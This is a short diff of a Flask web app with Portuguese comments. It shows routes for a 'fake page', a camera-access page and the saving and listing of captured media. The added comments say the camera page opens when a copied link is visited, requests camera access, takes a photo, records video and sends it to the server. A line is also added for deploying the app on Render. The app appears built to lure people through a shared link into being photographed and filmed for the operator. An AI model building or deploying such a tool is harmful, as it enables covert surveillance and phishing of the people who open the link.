@@ -33,7 +33,10 @@ def pagina_fake():
 
 @app.route('/acessar_camera')
 def acessar_camera():
-    return render_template('acessar_camera.html')
+    # Esta página será aberta quando o link copiado for acessado.
+    # Ela precisará conter o JavaScript para solicitar acesso à câmera,
+    # tirar a foto, gravar o vídeo e enviar para o servidor.
+    return render_template('acessar_camera.html') # Criaremos este arquivo HTML
 
 @app.route('/salvar_midia', methods=['POST'])
 def salvar_midia():
@@ -75,6 +78,9 @@ def listar_videos():
     except:
         videos = []
     return render_template('videos.html', videos=videos)
+
+# Necessário para Render
+application = app
 
 if __name__ == '__main__':
     app.run(debug=True)
